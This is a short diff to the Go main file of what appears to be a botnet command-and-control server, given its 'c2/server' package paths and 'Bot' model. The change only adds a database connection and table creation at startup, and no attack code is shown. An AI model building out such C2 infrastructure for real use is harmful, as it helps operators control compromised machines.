@@ -1,6 +1,7 @@
 package main
 
 import (
+	database "c2/server/db"
 	"c2/server/models"
 	"log"
 	"net/http"
@@ -33,6 +34,11 @@ func (c *c2) GetBot(id string) *models.Bot {
 }
 
 func main() {
+	db := database.NewDbConnection()
+	if err := db.CreateTable(); err != nil {
+		log.Fatal("Failed to execute query: ", err)
+	}
+
 	var wg sync.WaitGroup
 	wg.Add(2)
 	c2 := Newc2()
